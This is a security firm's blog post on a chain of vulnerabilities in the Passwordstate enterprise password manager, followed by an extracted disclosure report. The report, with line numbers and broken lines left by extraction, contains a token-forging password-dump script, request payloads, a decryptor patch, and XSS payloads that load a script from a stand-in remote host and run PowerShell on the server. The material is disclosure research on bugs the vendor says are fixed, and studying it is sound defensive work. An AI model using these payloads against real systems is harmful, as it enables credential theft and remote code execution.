=== Content from modzero.com_f96f6d5e_20250108_115802.html ===

# [mod%log](../../../../../index.html)

modzero AG

[Main](../../../../../index.html) >
[Archives](../../../../../archives/index.html) >
[2022](../../../../../archives/2022/index.html) >

[12](../../../../../archives/2022/12/index.html) >

[<](../../../../../archives/2022/08/22/ridiculous_vulnerability_disclosure_process_with_crowdstrike_falcon_sensor/index.html)

10:00:04
## 2022-12-19

### Better Make Sure Your Password Manager Is Secure

#### Or Someone Else Will

### tl;dr

As part of a security analysis, our colleagues kuekerino ([T](https://twitter.com/kuekerino) / [M](https://chaos.social/%40kuekerino)), ubahnverleih ([T](https://twitter.com/ubahnverleih) / [M](https://chaos.social/%40ubahnverleih)) and parzel ([T](https://twitter.com/parzel2) / [M](https://chaos.social/%40parzel)) examined the password management solution Passwordstate of Click Studios and identified multiple high severity vulnerabilities (CVE-2022-3875, CVE-2022-3876, CVE-2022-3877). Successful exploitation allows an unauthenticated attacker to exfiltrate passwords from an instance, overwrite all stored passwords within the database, or elevate their privileges within the application. The individual vulnerabilities can be chained to gain a shell on the Passwordstate host system and dump all stored passwords in cleartext – Starting with nothing more than a valid username!

Details about these and all other identified security vulnerabilities in Passwordstate can be found in our [published disclosure report [PDF]](https://www.modzero.com/static/MZ-22-03_Passwordstate_Security_Disclosure_Report-v1.0.pdf).

Click Studios states that all vulnerabilites are fixed since [Passwordstate 9.6 - Build 9653](https://www.clickstudios.com.au/passwordstate-changelog.aspx).

### Securing Your Password Manager Is Crucial for the Security of Your Organization

Many enterprise organizations [struggle with password management](https://www.rapid7.com/research/reports/under-the-hoodie-2020/). Password management solutions simplify this process by generating, storing and managing our passwords. Storing passwords in a secure password manager is so far the best method to safe-keep passwords, but it is important to understand that the more secrets are stored within a single centralized location, the more valuable it will be for criminals. Therefore it is of crucial importance that the solution storing the secrets is secure.

We experienced first hand how severe that lack of security can be, when we conducted a pentest for a customer. The customer planned to migrate their password management to the solution [Passwordstate by Click Studios](https://www.clickstudios.com.au/) and wanted to make sure that their passwords would be securely stored and can only be accessed by authorized users.

Passwordstate is an on-premise enterprise password management solution. It allows its users to store, access and share sensitive password material. The password manager has support for a vast amount of features, different access control systems and connectors to enterprise identity management solutions. With over 29,000 customers, ["spanning from the largest of enterprises, including many Fortune 500 companies to the smallest of IT shops"](https://www.clickstudios.com.au/our-customers.aspx), it is widely deployed.

We started our analysis by setting up our own instance of Passwordstate with a machine-in-the-middle setup. This allowed more transparent and dynamic testing. Afterwards we used the whole application for a few hours to map as many of the available features as possible. Our first observation was that the core of the application uses a framework, but the various API parts had a more custom tailored feel. Some API components used a different authentication mechanism and we suspected that it was developed without the framework. This seemed to be a promising place to start, as custom written code most often is more prone to errors.

The first API we looked into was the browser extension API. Passwordstate has support for a browser extension, which can store, modify and retrieve passwords for users. As this API directly handles confidential credentials, it peaked our interest.

The browser extension authenticates against the API with a token and we wanted to know how it is generated. As the software is written in C#, it should have been easy to decompile it. To prevent decompilation, the vendor used code obfuscators – these can't hide the code completely, but can make it more time-consuming to decompile or understand the code. Contrary to a real attack, time is limited in pentests. So, instead of deobfuscating the code, we tried another approach: The changelogs of the software showed that code obfuscation was introduced a few major versions before. These versions cannot be downloaded on Clickstudios' website anymore, but the Internet Archive had some older [versions available](https://web.archive.org/web/20180310101622/https%3A//clickstudios.com.au/previous-builds.aspx).

The decompiled version contained a surprise for us: The API token is not some randomly generated string or secret, neither is it cryptographically signed. Instead, the API token contained concatenated user information that was XOR encrypted with a hardcoded key. A decrypted example can bee seen here:
```

user;abc;def;144503

```

Even more surprising was the code, which validated the token: The only field from the string used for authentication and authorization was the username. This implied the following:

* Tokens cannot be invalidated when they are compromised
* Tokens are not changed on a user's password change
* We can create our own token for a known username

The last point is crucial: We only need to know an existing username to craft a valid API token with the hardcoded XOR key. As a result we can access and modify all data which the browser extension can access and this includes all passwords of that user that have a URL entry attached to it. This is the default for any password stored through the browser extension. We were off to a great start, but there were some passwords left within the instance we could not access yet. So we decided we need to dig deeper to acquire them as well.

The fact that we retrieved the requested passwords from the API in cleartext got us thinking. Because this means that the passwords are either not stored encrypted on the server or are stored with only server-side encryption within the database. An inspection of the database on our installation showed that the latter was the case. In fact, the server-side decryption was already reversed by Northwave Security a few years back. They have published a [proof of concept](https://github.com/NorthwaveSecurity/passwordstate-decryptor) which allowed to extract the obfuscated AES key used for encrypting the database from different files on the system and snippets from the database. Afterwards it dumps all passwords stored within the database.

We consider this architecture a fundamental design flaw, as any attacker with access to the host system can dump all stored passwords on it! The linked code though is only working for builds until version 8903, afterwards it was mitigated with an [update](https://github.com/NorthwaveSecurity/passwordstate-decryptor/issues/1). There was no major announcement regarding a change of cryptographic implementation in Click Studios' changelog or release notes. This led us to believe that the fix may not address the root cause but only changed and subsequently obfuscated the decryption process enough to break the proof of concept tool. To verify our suspicion we generated the previously working encryption key with the tool:
![](/static/Passwordstate/passwordstate-decryptor.png)

Generated encryption key

We performed some in-memory searches to see if the key is still in use by the application in its previous form. Yes, it was! And right next to it was something which looked very similiar to a key as well. We tried decrypting the database with it and it worked. The following image shows the two keys next to each other. Can you spot the connection? A simple one-line patch is sufficient to make the password decryptor work again.
![](/static/Passwordstate/memory.png)

Memory Scan

But in order to get to the encrypted passwords, we would need access to the database or – even better – get a reverse shell.

We already mentioned the vast feature set of Passwordstate like its role based access system. Users with the administrator roles have a special menu that gives access to many administrative features, for example backing up the database or adding new users. Or – and this feature seemed particularly interesting to us – the ability to run arbitrary Powershell scripts on the host-machine: Code execution as a service! If we could find a way to elevate our privileges within Passwordstate to an administrator user, we could access the host system and dump all passwords. But remember, we may have access to the browser extension API so far, but that does not give us access to an actual session within the web instance.

As the Passwordstate user interface is a website, this provides a huge surface for cross-site scripting (XSS) attacks. We did not have to dig deep to find one: URLs could be assigned to passwords which can quickly be visited from within the password manager. The link validation was insufficient and allowed the use of the JavaScript protocol handler and therefore for easy XSS attacks with a single click.

The actual URL is mostly hidden in Passwordstates' user-interface, increasing the probability of an unsuspecting user clicking the link. And here comes *the art of make humans clicking links*: As an authenticated user this is easy – Passwordstate allows sharing of password lists. Inviting a colleague to the password list for the next project is common. And if the only place where the URLs are shared is the shared list, a click on the link is not unlikely.

But what seems even more authentic than a link in a shared password list? A link in a user's private password list. How do we do that? With an [IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References).

We already found a major vulnerability within the browser extension API and as hackers we know: One vulnerability seldom comes alone. One of the first things we checked with our unauthenticated API access was, if we can access other user's passwords. We had no luck with that, but discovered that it is possible to store new password entries within other people's password lists when the list's ID is known by using the following request:
```

POST /api/browserextension/addpassword/ HTTP/2
Host: XXX
Cookie: session-id=XXX
Content-Length: XXX
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

auth_key=XXX&PasswordList=anything&PasswordListID=1&Title=please+open+me&UserName=username&D
escription=please+open+me&URL=any_url&Password=password&WebsiteFav
icon=anything

```

This even worked for private password lists! When inspecting the request to the API, we quickly noticed the numerical and incremental nature of the IDs that are used in the requests. Simply by iterating, an attacker can add the XSS payload to every single password list in the system – And that is exactly what we needed to spray the XSS payload.

### The Exploit

Now we had all the puzzle pieces for an exciting vulnerability chain that could get us from a remote attacker with only a valid username to accessing all passwords stored on the Passwordstate instance. The cherry on top is of course the reverse shell on the instance that allows an attacker to keep their access even when these vulnerabilities are fixed.

Let's see how the individual vulnerabilities can be combined:

1. Forge an API token for a valid username
   ![](/static/Passwordstate/1.gif)

   Forge an API token for a valid username
2. Iterate through all public and private password lists and add malicious password entries with the XSS payload in the URL field
   ![](/static/Passwordstate/2.gif)

   Iterate through lists
3. Wait until an administrator opens the prepared password entry and cover it by opening a benign URL
   ![](/static/Passwordstate/3.gif)

   Wait until an administrator opens the entry
4. Get a reverse shell
   ![](/static/Passwordstate/4.gif)

   RUN CMD
5. Finally decrypt and dump all passwords stored within the Passwordstate instance
   ![](/static/Passwordstate/5.gif)

   Decrypt and dump

### Conclusion

Password safety and therefore password management solutions are the foundation on which an organization's security infrastructure is built on. They are the keys to the queendom and as such they should be handled with the utmost care. Their security must be treated as a holistic endeavor from architecture to implementation and maintenance. A vast feature set often also implies a huge attack surface, with lots of room for errors.

The uncovered findings show the incredible importance of ongoing security audits for critical assets and red teaming engagements within organizations.

### Acknowledgement

We want to thank Click Studios for the open and transparent communication within the disclosure process. Click Studios was responsive throughout the entire process and released their fixes swiftly after receiving our report.

### Advisory & Timeline

Find the full technical details about these vulnerabilities, proof of concept code, the disclosure timeline and all other identified vulnerabilities in [our disclosure report [PDF]](https://www.modzero.com/static/MZ-22-03_Passwordstate_Security_Disclosure_Report-v1.0.pdf).

Posted by modzero
| [Permanent link](../../../../../archives/2022/12/19/better_make_sure_your_password_manager_is_secure/index.html)
| File under: [security](../../../../../archives/security/index.html),
[software](../../../../../archives/software/index.html),
[hacking](../../../../../archives/hacking/index.html),
[exploit](../../../../../archives/exploit/index.html),
[crypto](../../../../../archives/crypto/index.html),
[advisory](../../../../../archives/advisory/index.html)

[/\](#top)



=== Content from www.modzero.com_a4b681ff_20250108_115804.html ===
Passwordstate

Versioning

Disclosure Timeline

Credits

▪
▪
▪

Contents

1 Summary

▪
▪

2 Findings

2.1 Authentication Bypass for API

Summary

Requirements

Details

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

#!/usr/bin/python3

import requests

import sys

if len(sys.argv) != 3:

    exit(f"Usage: ./{sys.argv[0]} URL USERNAME")

url = sys.argv[1]

user = sys.argv[2]

data_in = user + ";;;"

auth_key = ""

xor_key = "REDACTED"

for i in range(0,len(data_in)):

    a = ord(data_in[i:i+1])

    b = ord(xor_key[(i+1) % len(xor_key)])

    auth_key += "{:02x}".format(a ^ b).upper()

print(f"[+] Generated auth_key for user {user}: {auth_key}")

cookies = {"session-id": auth_key}

data = {"auth_key": auth_key}

response = requests.post(url + "/api/browserextension/getwebsites/", cookies=cookies,

data=data, verify=False)

website_list = response.json()

if response.status_code == 200:

    print(f"[+] Found {len(website_list)} passwords")

    for item in website_list:

        data["PasswordID"] = item["PasswordID"]

        response = requests.post(url + "/api/browserextension/getpassword/",

cookies=cookies, data=data, verify=False)

        item["Password"] = response.json()[0]["Password"]

        print(item)

else:

    print("[-] Could not access API")

2.2 Authorization Bypass Through User-Controlled

Keys

Summary

Requirements

Details

1
2
3
4
5
6
7

POST /api/browserextension/UpdatePassword/ HTTP/1.1
Host: XXX
Cookie: session-id=XXX
Content-Length: 57
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

auth_key=XXX&Password=overwritten&PasswordID=1&PassswordListID=

1
2
3
4
5
6
7

POST /api/browserextension/addpassword/ HTTP/2
Host: XXX
Cookie: session-id=44425C4B0A0A02
Content-Length: 178
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

auth_key=44425C4B0A0A02&PasswordList=x&PasswordListID=1&Title=Fake&UserName=username&D
escription=please+open+me&URL=javascript%3aalert('mod')//&Password=password&WebsiteFav
icon=x

2.3 Failed Protection for Stored Passwords due to

Server-Side Symmetric Encryption

Summary

Requirements

Details

From b18f4ddeee0ebbed5bd9a818c00567594841260e Mon Sep 17 00:00:00 2001

From: mod0

Date: Fri, 12 Aug 2022 14:05:41 +0200

Subject: [PATCH] fixed poc for version 8903 and above

1

2

3

4

5

1 Northwave Red Team, Passwordstate decryptor,
https://github.com/NorthwaveSecurity/passwordstate-decryptor/ [2022-08-18]

6

7

8

9

10

11

12

13

14

15

16

17

---

 PasswordStateDecryptor.ps1 | 6 +++++-

 1 file changed, 5 insertions(+), 1 deletion(-)

diff --git a/PasswordStateDecryptor.ps1 b/PasswordStateDecryptor.ps1

index f6e371a..099216b 100644

--- a/PasswordStateDecryptor.ps1

+++ b/PasswordStateDecryptor.ps1

@@ -140,7 +140,11 @@ function Invoke-PasswordStateDecryptor {

             # Combine secrets and return recovered Text String

             $EncryptionKey =

[Moserware.Security.Cryptography.SecretCombiner]::Combine($Secret1 + "`n" +

$Secret3).RecoveredTextString

18

-            Write-Host -ForegroundColor Green "Recovered Encryption Key:

$EncryptionKey!"

+

+            # For versions >= 8903

+            $EncryptionKey = $EncryptionKey[-1..-$EncryptionKey.Length ] -join ""

+

+            Write-Host -ForegroundColor Green "Recovered Encryption Key:

$EncryptionKey"

         }

         $RawEncryptionKey = Convert-HexStringToByteArray $EncryptionKey

--

2.34.1

19

20

21

22

23

24

25

26

27

28

2.4 Stored Cross-Site Scripting (XSS)

Summary

Requirements

Details

1

javascript:alert('mod0')//

1

javascript:d=window.opener.document;e=d.createElement("script");e.setAttribute("src","

https://REMOTE_HOST/xss-

rce.js");d.body.appendChild(e);window.location.replace("https://example.com")//

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

fetch('/admin/powershellscripts/discovery/testscript.aspx?ScriptID=1')

.then((resp) => resp.text())

.then(function (data) {

var doc = new DOMParser().parseFromString(data, "text/html");

var form = doc.querySelectorAll("form")[0];

var input = document.createElement("input");

input.setAttribute('name', '__ASYNCPOST');

input.setAttribute('value', 'true');

form.append(input);

form.__EVENTTARGET.value='RunScriptButton';

var input3 = document.createElement("input");

input3.setAttribute('name', 'RadScriptManager1');

input3.setAttribute('value', 'RunScriptButtonPanel|RunScriptButton');

form.append(input3);

form.HiddenScript.value="POWERSHELL_COMMANDS"

fetch("/admin/powershellscripts/discovery/testscript.aspx?ScriptID=1",{

method: "POST", body: new URLSearchParams(new FormData(form)) })

17

})

2.5 Use of Hard-coded Emergency Credentials for API

Summary

Requirements

Details

1

2

GET
/api/webcharts/auditingchart/Passwordstate_EmergencyAccess?platform=All%20Platforms&Ac
tivityType=Discovery%20Job%20Permissions%20Removed&Duration=36&SiteID=&ArchivedData=1
HTTP/1.1
Host: XXX

2.6 Insufficiently Protected Credentials for Password

Lists

Summary

Requirements

Details

1

<input name="Password" type="password" maxlength="100" id="Password"
disabled="disabled" class="aspNetDisabled" autocomplete="new-password"
value="secretpasswordlistpassword" style="width:300px;">

2.7 Improper Authorization Allows Attacker-

Controlled Browser Extension Provisioning

Summary

Requirements

Details

1

2
3
4
5
6
7

<input name="PasswordstateBrowserExtensionURL" type="text"
value="http://ATTACKER_CONTROLLED_WEBSITE/TOKEN" id="PasswordstateBrowserExtensionURL"
style="display: none;">
<script>
const myTimeout = setTimeout(myConfirm, 1000);
function myConfirm() {
    document.getElementById("confirm_auth").click()
}
</script>


